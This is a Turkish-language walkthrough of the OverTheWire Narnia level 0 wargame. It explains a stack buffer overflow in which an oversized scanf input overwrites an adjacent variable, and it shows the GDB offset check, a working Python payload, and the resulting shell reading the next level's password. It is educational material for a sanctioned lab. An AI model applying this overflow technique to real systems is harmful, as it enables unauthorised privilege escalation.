# 💥 OverTheWire Narnia — Level 0 → Level 1
## Stack Buffer Overflow: Komşu Değişkeni Ezmek

> Narnia'nın ilk seviyesi ve binary exploitation'a giriş kapısı. Burada
> EIP'yi falan ele geçirmiyoruz — sadece taşan bir buffer'ın **yanındaki
> değişkene** sızıp değerini değiştiriyoruz. Buffer overflow'un en saf hâli.

| | |
|---|---|
| **Bağlantı** | `ssh narnia0@narnia.labs.overthewire.org -p 2226` (şifre: `narnia0`) |
| **Kaynak** | `/narnia/narnia0.c` · binary: `/narnia/narnia0` |
| **Kavram** | Stack buffer overflow → bitişik değişkeni ezme |
| **Zorluk** | ⭐☆☆☆☆ |

**Bu level için gereken konular** (hazır değilsen önce bunları oku):
- [`01_bellek_ve_memory_layout.md`](../../konu_anlatimlari/binary_exploitation/01_bellek_ve_memory_layout.md) — değişkenler stack'te nasıl yan yana dizilir
- [`02_little_endian.md`](../../konu_anlatimlari/binary_exploitation/02_little_endian.md) — `0xdeadbeef`'i neden ters yazıyoruz
- [`00b_gdb_ile_assembly_okumak.md`](../../konu_anlatimlari/binary_exploitation/00b_gdb_ile_assembly_okumak.md) — `disas` / `x` komutları

---

## 🎯 Hedef

Program, `val` adında bir değişkeni `0x41414141` ile başlatıyor. Eğer biz onu `0xdeadbeef` yapabilirsek program bize bir shell veriyor. Sorun şu: `val`'e doğrudan erişimimiz yok — sadece klavyeden bir string okutabiliyoruz. İşte o string'i taşırıp `val`'in üzerine yazacağız.

---

## 📖 Kaynak Kod

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(){
    long val = 0x41414141;     // ← hedefimiz: bunu 0xdeadbeef yapmak
    char buf[20];              // ← 20 byte'lık buffer (taşıracağımız yer)

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s", &buf);       // ← AÇIK BURADA: 24 byte okuyor, buf 20 byte!

    printf("buf: %s\n", buf);
    printf("val: 0x%08x\n", val);

    if(val == 0xdeadbeef){
        setreuid(geteuid(), geteuid());   // ← shell'in narnia1 yetkisini koru
        system("/bin/sh");                // ← ödül: shell
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }
    return 0;
}
```

---

## 🔍 Kaynak Kodu Analizi — Açık Nerede?

Tek satıra bakıyoruz:

```c
char buf[20];
scanf("%24s", &buf);
```

`buf` yalnızca **20 byte**. Ama `scanf("%24s", ...)` formatı **24 karaktere kadar** okumaya izin veriyor. Üstüne, `scanf` okuduğu string'in sonuna bir de `\0` (null) ekler — yani en kötü ihtimalle **25 byte** yazabilir. 20 byte'lık bir kutuya 24-25 byte sığdırmaya çalışınca fazlalık **bitişikteki belleğe**, yani `val`'in üzerine taşar.

> 💡 **`&buf` mı `buf` mı?** Dizilerde ikisi de aynı adrese çözülür (`buf` zaten dizinin ilk elemanının adresine "decay" eder). `&buf`'ın tipi `char (*)[20]`, `buf`'ınki `char *` — ama **sayısal değer aynı**, yani `scanf` açısından fark etmez. Acemiyi şaşırtan bir detaydır, hata değildir.

İki ek incelik, ikisi de neden bu level'ın "çalıştığını" açıklar:

- **`scanf("%24s")` boşlukta durur.** `%s` formatı boşluk/tab/newline görünce okumayı keser. Yani payload'ımızda **boşluk karakteri (`0x20`), tab (`0x09`), newline (`0x0a`) olmamalı.** Neyse ki `0xdeadbeef`'in byte'ları (`ef be ad de`) bunların hiçbiri değil — şanslıyız.
- **`setreuid(geteuid(), geteuid())` neden var?** `narnia0` binary'si **SUID narnia1**'dir; yani çalışırken *effective uid* = narnia1, *real uid* = narnia0. `bash` güvenlik için açılışta `euid != ruid` görürse yetkiyi düşürür. `setreuid` ile her ikisini de narnia1 yapıyoruz ki `system("/bin/sh")` açtığında shell **narnia1 yetkisini korusun**. Bu satır olmasaydı shell'i alırdık ama hâlâ narnia0 olurduk.

---

## 📚 Gereken Teori (özet)

Detayı bağladığım konu dosyalarında; burada level için lazım olan kadarını özetliyorum.

**Stack'te değişken komşuluğu.** Fonksiyon içindeki yerel değişkenler stack'te yan yana oturur. Bu binary'de düzen şöyle (yüksek → düşük adres):

```
Yüksek Adres
┌────────────────────┐
│   Saved EIP        │
├────────────────────┤
│   Saved EBP        │
├────────────────────┤
│   val (4 byte)     │  ← 0x41414141 → 0xdeadbeef yapacağımız hedef
├────────────────────┤
│   buf[19]          │  ┐
│   ...              │  │  buf (20 byte)
│   buf[0]           │  ┘  ← scanf buraya yazmaya başlar, YUKARI doğru taşar
└────────────────────┘
Düşük Adres
```

`buf` düşük adreste, `val` onun hemen üstünde. `scanf` `buf[0]`'dan başlayıp yukarı doğru yazar — 20 byte'ı doldurunca devamı `val`'e girer.

**Little-endian.** x86 sayıları ters byte sırasıyla saklar. `0xdeadbeef`'i belleğe yazmak için byte'ları tersten dizeriz: `\xef\xbe\xad\xde`. (Bkz. `02_little_endian.md` — string'ler ters çevrilmez, sadece sayılar/adresler.)

---

## 🧪 Adım Adım Keşif (GDB)

Açığı "biliyoruz" ama önce **GDB ile görelim** — özellikle `buf`'tan `val`'e kaç byte olduğunu kaynaktan değil binary'den doğrulamak şart (derleyici padding ekleyebilir).

> ℹ️ Aşağıdaki adresler **örnektir**, sende farklı çıkar. Önemli olan offset'ler (`ebp-0x..`) ve aralarındaki fark.

```bash
narnia0@narnia:/narnia$ gdb -q ./narnia0
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x080484bd <+0>:    push   ebp
   0x080484be <+1>:    mov    ebp,esp
   0x080484c0 <+3>:    sub    esp,0x28
   0x080484c3 <+6>:    mov    DWORD PTR [ebp-0xc],0x41414141   ; long val = 0x41414141
   ...
   0x080484e1 <+36>:   lea    eax,[ebp-0x20]                   ; &buf  → buf = ebp-0x20
   0x080484e4 <+39>:   push   eax
   0x080484e5 <+40>:   push   0x80485e3                        ; "%24s"
   0x080484ea <+45>:   call   0x8048380 <__isoc99_scanf@plt>
   ...
   0x08048515 <+88>:   cmp    DWORD PTR [ebp-0xc],0xdeadbeef   ; if(val == 0xdeadbeef)
   0x0804851c <+95>:   jne    0x804852f <main+114>
   ...
End of assembler dump.
```

Buradan iki adresi okuyoruz:

```
buf = ebp - 0x20   (lea eax,[ebp-0x20] satırından)
val = ebp - 0x0c   (mov DWORD PTR [ebp-0xc],0x41414141 satırından)

buf'tan val'e mesafe = 0x20 - 0x0c = 0x14 = 20 byte
```

**20 byte.** Yani 20 byte yazınca `buf` tam dolar, 21. byte'tan itibaren `val`'e girmeye başlarız. Kaynaktaki `buf[20]` ile birebir uyuştu — ama yine de GDB'den teyit etmek alışkanlık olmalı.

Şimdi taşmayı **canlı görelim**. 20 `A` + 4 `B` gönderip `val`'in gerçekten ezildiğini kontrol edelim:

```bash
(gdb) run <<< $(python3 -c 'print("A"*20 + "BBBB")')
...
(gdb) x/wx $ebp-0xc
0xffffd06c:  0x42424242        ← "BBBB" = val ezildi! ✓
```

`val`'in yerinde artık `0x42424242` ("BBBB") var. Demek ki 20 byte dolgudan sonraki 4 byte doğrudan `val`'e yazılıyor. Geriye o 4 byte'ı `0xdeadbeef` yapmak kalıyor.

---

## 🛠️ Exploit'i Kurmak

Payload mantığı çok basit:

```
[20 byte dolgu] + [0xdeadbeef — little-endian]
   "A" * 20     +   "\xef\xbe\xad\xde"
```

Parça parça:

| Parça | İçerik | Amaç |
|---|---|---|
| Dolgu | `b"A" * 20` | `buf`'ı tam doldur (20 byte) |
| Hedef | `b"\xef\xbe\xad\xde"` | `val`'e `0xdeadbeef` yaz (little-endian!) |

Python 3'te ham byte üretirken **`sys.stdout.buffer.write`** kullanmak zorundayız (detay aşağıda, "Yaygın Hatalar"):

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde")'
```

---

## ▶️ Çalıştırma

```bash
narnia0@narnia:/narnia$ (python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde")'; cat) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAA
val: 0xdeadbeef                       ← val değişti! ✓
whoami
narnia1
cat /etc/narnia_pass/narnia1
<şifre buraya gelir>
```

Şifre `narnia1` kullanıcısına ait — kopyala, bir sonraki level'a onunla bağlan.

> 💡 **`(... ; cat)` neden gerekli?** Payload'u pipe'la gönderince `./narnia0`'ın stdin'i payload bittiği anda kapanır. Shell açılır ama "girdi yok" deyip hemen kapanır. `cat`, payload'dan sonra **senin klavyenden** okuyarak stdin'i açık tutar, böylece açılan shell'e `whoami`, `cat ...` gibi komutlar yazabilirsin. Çıkmak için `Ctrl+D`.

---

## ⚠️ Yaygın Hatalar / Tuzaklar

**1. `print()` ile ham byte göndermek (en sık hata).**
Python 3'te `print("\xef\xbe\xad\xde")` byte'ları **bozar** — `"\xef"` bir `str`'dir ve stdout'a yazılırken UTF-8'e kodlanır (`0xef` → `0xc3 0xaf`). Exploit patlar. Ham byte için **mutlaka** `sys.stdout.buffer.write(b"...")`:
```bash
# YANLIŞ — \xef'i bozar
python3 -c 'print("A"*20 + "\xef\xbe\xad\xde")'
# DOĞRU
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde")'
```
(Sadece ASCII üreten `"A"*20` gibi şeylerde `print` sorunsuz; tuzak yalnızca `\x..` byte'larında.)

**2. Adresi/değeri düz yazmak.**
`0xdeadbeef`'i `\xde\xad\xbe\xef` diye yazarsan `val` `0xefbeadde` olur — yanlış. Little-endian: **`\xef\xbe\xad\xde`**.

**3. Dolguyu yanlış saymak.**
20 değil de 24 byte dolgu koyarsan `val`'i 4 byte kaydırarak ezersin. GDB'den teyit ettiğimiz sayı **20**.

**4. Payload'a boşluk/newline karıştırmak.**
`scanf("%s")` boşlukta durur. Bizim byte'larımız temiz ama hedef değer `0x20`/`0x0a` gibi bir byte içerseydi `%s` orada kesilirdi — bu seviyede sorun yok, ama aklında olsun.

---

## ✅ Ne Öğrendik

- Bir buffer'ı sınırının ötesinde doldurmak, **bitişikteki değişkeni** ezer (stack komşuluğu).
- `scanf("%Ns")` `N` karakter okur ama bir de `\0` ekler → `N+1` byte yazabilir.
- Sayıları belleğe **little-endian** yazarız.
- Offset'i kaynaktan tahmin etsek de **GDB ile doğrularız** (`disas` + `x`).
- SUID binary'de shell'in yetkisini korumak için `setreuid` gerekebilir.

Bu, EIP kontrolüne giden yolun ilk adımı: burada komşu *değişkeni* ezdik; ileride aynı mantıkla komşu *dönüş adresini* (Saved EIP) ezeceğiz.

---

## ➡️ Sonraki

**[Level 1 → Level 2 — Environment Variable Shellcode](./narnia_1-2.md)**
Bir sonraki level'da ilk shellcode'umuzu yazıp bir environment variable üzerinden çalıştıracağız.

---

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
